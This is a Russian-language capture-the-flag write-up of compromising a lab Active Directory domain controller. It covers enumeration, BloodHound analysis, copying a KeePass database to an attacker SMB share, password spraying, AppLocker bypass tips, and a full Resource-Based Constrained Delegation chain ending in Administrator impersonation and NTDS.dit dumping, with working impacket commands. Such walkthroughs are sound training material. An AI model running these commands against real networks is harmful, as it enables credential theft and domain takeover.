### ДЛЯ РЕШЕНИЯ НЕОБХОДИМО:
- навыки работы с АД, bloodhound
- умение эксплуатировать Resource-Based Constrained Delegation (RBCD) (привилегия AddAllowedToAct)
- понимание DPAPI
### Решение
начинаем с того, что у нас уже есть права пользователя j.smith. для начала просто осмотримся - просканим порты, при возможности посмотрим шары и сдампим систему в bloodhound
```
└─$ rustscan --ulimit 5000 --range 0-65535 -a ip -- -O -sC -sV -oX results.xml
...
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-09 19:35:03Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: ctf.local, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CTF
|   NetBIOS_Domain_Name: CTF
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: ctf.local
|   DNS_Computer_Name: DC01.ctf.local
|   DNS_Tree_Name: ctf.local
и еще динамические порты пол rdp
```
отсюда сразу узнаем, что мы находимся на контроллере домена. порты открыты стандартные, попробуем сразу энумеровать систему. через ```enum4linux-ng -A ip -u 'j.smith@ctf.local' -p 'JSmith@IT2024'``` сразу узнаем версию ос, имена пользователей, все группы и доступные шары. посмотрим, что там

```
smbmap -H ip -u 'j.smith' -p 'JSmith@IT2024'
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Downloads                                               READ ONLY       File drop share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
```
в шарах что-то полезное оказалось только в sysvol (```smbclient //ip/SYSVOL -U "ctf.local\j.smith%JSmith@IT2024"```) - туда загружена политика паролей и, что самое главное, настройки реестра и привилегии

```

smb: \ctf.local\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\> get GptTmpl.inf -
Unicode=yes
[Registry Values]
MACHINE\System\CurrentControlSet\Services\NTDS\Parameters\LDAPServerIntegrity=4,1
MACHINE\System\CurrentControlSet\Services\Netlogon\Parameters\RequireSignOrSeal=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\RequireSecuritySignature=4,1
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
[Version]
signature="$CHICAGO$"
Revision=1
[Privilege Rights]
SeAssignPrimaryTokenPrivilege = *S-1-5-19,*S-1-5-20
SeAuditPrivilege = *S-1-5-19,*S-1-5-20
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeBatchLogonRight = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-559
SeChangeNotifyPrivilege = *S-1-1-0,*S-1-5-19,*S-1-5-20,*S-1-5-32-544,*S-1-5-11,*S-1-5-32-554
SeCreatePagefilePrivilege = *S-1-5-32-544
SeDebugPrivilege = *S-1-5-32-544
SeIncreaseBasePriorityPrivilege = *S-1-5-32-544,*S-1-5-90-0
SeIncreaseQuotaPrivilege = *S-1-5-19,*S-1-5-20,*S-1-5-32-544
SeInteractiveLogonRight = *S-1-5-21-1966530601-3185510712-10604624-1611,*S-1-5-21-1966530601-3185510712-10604624-1609,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-21-1966530601-3185510712-10604624-1610
SeLoadDriverPrivilege = *S-1-5-32-544,*S-1-5-32-550
SeMachineAccountPrivilege = *S-1-5-11
SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
SeProfileSingleProcessPrivilege = *S-1-5-32-544
SeRemoteShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-549
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549
SeSecurityPrivilege = *S-1-5-32-544
SeShutdownPrivilege = *S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-549,*S-1-5-32-550
SeSystemEnvironmentPrivilege = *S-1-5-32-544
SeSystemProfilePrivilege = *S-1-5-32-544,*S-1-5-80-3139157870-2983391045-3678747466-658725712-1809340420
SeSystemTimePrivilege = *S-1-5-19,*S-1-5-32-544,*S-1-5-32-549
SeTakeOwnershipPrivilege = *S-1-5-32-544
SeUndockPrivilege = *S-1-5-32-544
SeEnableDelegationPrivilege = *S-1-5-32-544
```
1. Настройка реестра (SMB Signing)
MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters\EnableSecuritySignature=4,1
(путь в реестре: HKLM\System\CurrentControlSet\Services\LanManServer\Parameters)
параметр: EnableSecuritySignature
тип и значение: 4,1 означает тип REG_DWORD (код 4) и значение 1 (Включено).
эта настройка включает подписывание SMB-пакетов на стороне сервера. предотвращает SMB Relay
2. Версия шаблона
signature="$CHICAGO$"
Revision=1
$CHICAGO$ — стандартная сигнатура, тянущаяся из времен Windows 95/NT, которую движок безопасности Windows до сих пор использует для идентификации файлов конфигурации безопасности (SecEdit)
3. Разрешения и привилегии  (самое важное!)
здесь права и привилегии операционной системы сопоставляются с sid'щм.
А. Кто может входить на компьютер?
      SeInteractiveLogonRight = *S-1-5-21-1966530601-3185510712-10604624-1611,*S-1-5-21-1966530601-3185510712-10604624-1609,*S-1-5-32-544,*S-1-5-32-551,*S-1-5-32-548,*S-1-5-32-549,*S-1-5-32-550,*S-1-5-9,*S-1-5-21-1966530601-3185510712-10604624-1610
SeInteractiveLogonRight — это право на локальный интерактивный вход в систему (включая RDP).
если сопоставить SID'ы из этого списка с результатами предыдущего сканирования enum4linux, мы увидим:
*S-1-5-21-...-1609 → пользователь j.smith
*S-1-5-21-...-1610 → пользователь t.jones
*S-1-5-21-...-1611 → пользователь r.williams
*S-1-5-32-544 → встроенная группа Администраторы (Administrators)
*S-1-5-32-548 → Операторы учетных записей (Account Operators)
*S-1-5-32-549 → Операторы серверов (Server Operators)

Б. кто может добавлять компьютеры в домен?
      SeMachineAccountPrivilege = *S-1-5-11
Код *S-1-5-11 — SID группы аутентифицированных юзеров.
В. другие стандартные привилегии
      SeDebugPrivilege = *S-1-5-32-544
право на отладку программ (применяется для дампа памяти LSASS). назначено только группе администраторы (*S-1-5-32-544), что является безопасным стандартом.
      SeBackupPrivilege и SeRestorePrivilege
права на архивацию и восстановление файлов (позволяют читать/писать любые файлы в обход стандартных NTFS-прав). газначены Администраторам (*S-1-5-32-544), операторам архивации (*S-1-5-32-551) и операторам серверов (*S-1-5-32-549).
      SeEnableDelegationPrivilege = *S-1-5-32-544
право включать доверие для делегирования у учетных записей компьютеров и пользователей. назначено только Администраторам (*S-1-5-32-544).
      SeNetworkLogonRight = *S-1-1-0,*S-1-5-32-544,*S-1-5-11,*S-1-5-9,*S-1-5-32-554
доступ к компьютеру из сети (например, по SMB/WinRM). разрешен группе «Все» (*S-1-1-0), «прошедшие проверку» (*S-1-5-11) и администраторам.

теперь понимаем, что у нас есть как минимум право на вход на контроллер, и примерно представляяем как распределены привилегии. это немного обрисовывает общую картину, если скан с bloodhound не удастся. теперь переходим, собственно, к нему

```
bloodhound-python -u j.smith -p 'JSmith@IT2024' -d ctf.local -ns ip -c All --zip
./bloodhound-cli containers start
```

сбор прошел успешно. подгружаем в графический интерфейс бладхаунда зип-архив и теперь, наконец, можем проанализировать домен. смит состоит в группе remote desktop users(значит, возможно подключение через xfreerdp). больше никаких интересных групп нет, путь к администратору домена выстроить не удалось. единственное, чьл напрягает - группа applocker, что значит, мы можем быть жестко ограничены (запрет на запуск исполняемых файлов/запуск PowerShell в режим Constrained Language Mode (ограниченный режим языка), в котором заблокирован запуск большинства функций .NET и сторонних скриптов.
Как это обходить (AppLocker Bypass):
Поиск папок-исключений: Администраторы часто забывают закрыть запись в определенные системные папки (например, C:\Windows\Tasks, C:\Windows\Temp или папки драйверов печати). Если в политиках AppLocker разрешен запуск всего, что находится внутри C:\Windows, вы можете перенести свой файл в C:\Windows\Tasks и запустить его оттуда.
Использование LOLBAS: Запуск программ с помощью доверенных и подписанных самой Microsoft системных утилит (таких как mshta.exe, rundll32.exe, regsvr32.exe), которые обходят правила AppLocker, потому что находятся в белом списке системы). но это в случае жестких ограничений - сначала нужно проверить

<img width="1123" height="457" alt="image" src="https://github.com/user-attachments/assets/b32b5444-936b-4115-b06a-0999110dd635" />

наконец заходим в учетную запись

```
xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local +clipboard /dynamic-resolution
```

сразу проверила ограничения clm через команду ```$ExecutionContext.SessionState.LanguageMode```. оказалось FullLanguage - хоть в этом моменте можно выдыхать спокойно. проверила пользователей через ```Get-ADUser -Filter * | Select-Object SamAccountName```

перед подгрузкой тяжелых скриптов осмотрелась - удостоверилась в отсутствии интересных групп и привилегий через ```whoami /all```, после проверила рабочий стол

```PS C:\Users\j.smith> Get-ChildItem -Path C:\Users\j.smith\Documents -Force```

там оказался файл Database.kdbx. сначала решила перекинуть его к себе

способы:
1. передача через Base64
Шаг 1. в консоли PowerShell конвертируем файл в Base64-строку и копируем ее:
```[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\j.smith\Documents\Database.kdbx"))```
Шаг 2. у себя декодируем
```echo 'СКОПИРОВАННЫЙ_ТЕКСТ' | base64 -d > Database.kdbx```
Решение 2. SMB-сервер (с авторизацией, тк без нее соединение блокается)
Шаг 1. запускаем SMB-сервер с учетными данными:
```impacket-smbserver share /tmp -smb2support -user test -password test```
Шаг 2. на Windows-машине монтируем папку с этими учетными данными:
```net use \\192.168.156.81\share /user:test test```
Шаг 3. копируем файл в павершелле:
```copy C:\Users\j.smith\Documents\Database.kdbx \\192.168.156.81\share\```
Решение 3. RDP со сквозным диском
```xfreerdp /v:ip /u:j.smith /p:'JSmith@IT2024' /d:ctf.local /drive:kali,/tmp +clipboard /dynamic-resolution```
Решение 4. SCP
Шаг 1. запускаем у себя ssh
```sudo systemctl start ssh```
передаем файл
```scp C:\Users\j.smith\Documents\Database.kdbx kali@ip:/tmp/```

попробовала забрутфорсить пароль через джона и хэшкат (```/snap/bin/john-the-ripper.keepass2john ~/Database.kdbx > ~/hash.txt```). ничего дельного не вышло, поэтому попробовала открыть файл на машине, тк там могло быть включено шифрование через ключ DPAPI. пробуем открыть файл на машине виндоус и бинго! сработало. там мы находим пароли от нескольких записей, хотя действительна только одна - t.jones. проверила через bloodhound - никаких интересных привилегий и путей до админа у него не показано, поэтому пока решила попробовать распылить пароли, чтобы зря не тратить время на пока кажущимся неперспективном аккаунте.

```
┌──(olya㉿olya)-[/tmp]
└─$ nxc smb ip -u users.txt -p pass.txt --continue-on-success
...
SMB         ip    445    DC01             [+] ctf.local\t.jones:***
SMB         ip    445    DC01             [+] ctf.local\r.williams:***
```

супер! пароль подошел к одному из доменных пользователей. проверим его через bloodhound

<img width="1054" height="418" alt="image" src="https://github.com/user-attachments/assets/0ed271c7-3d77-48cc-8825-379d9a3ce0bf" />

он состоит в сисадминах - уже хороший знак. также здесь уже появляется прямой путь до админа домена - через привилегию

<img width="1483" height="454" alt="image" src="https://github.com/user-attachments/assets/e347cfef-0469-449e-bd8c-5f0f46da2736" />

это уязвимость Resource-Based Constrained Delegation (RBCD) (ограниченное делегирование на основе ресурсов). мы можем изменить атрибут msDS-AllowedToActOnBehalfOfOtherIdentity на контроллере домена DC01. это позволит учетной записи компьютера, которую мы сами создадим, выдавать себя за любого пользователя домена (включая Администратора) при обращении к DC01.

Шаг 1: создаем новую учетную запись компьютера. ранее мы уже видели в настройках безопасности, что такое право у нас есть

```impacket-addcomputer -dc-ip <IP_DC> -computer-name 'ATTACKERSYSTEM$' -computer-pass 'Summer2018!' 'ctf.local/r.williams:***'```

Шаг 2: настраиваем делегирование
укажем контроллеру домена DC01$, что наш созданный компьютер ATTACKERSYSTEM$ имеет право делегирования:

```impacket-rbcd -dc-ip <IP_DC> -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC01$' -action 'write' 'ctf.local/r.williams:***'```

Шаг 3: запрашиваем билет (Service Ticket) от имени администратора
заставим службу Kerberos выдать нам билет для службы cifs на DC01, выдав себя за встроенного администратора:

```impacket-getST -dc-ip <IP_DC> -spn 'cifs/DC01.ctf.local' -impersonate 'Administrator' 'ctf.local/ATTACKERSYSTEM$:Summer2018!'```

Шаг 4: Импортируем полученный билет и заходим на контроллер домена

```
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'
```

(либо можно сдампить все пароли и хэши из базы данных домена NTDS.dit: ```impacket-secretsdump -k -no-pass 'ctf.local/Administrator@DC01.ctf.local'```)

подключаемся за админа и забираем флаг!🥳
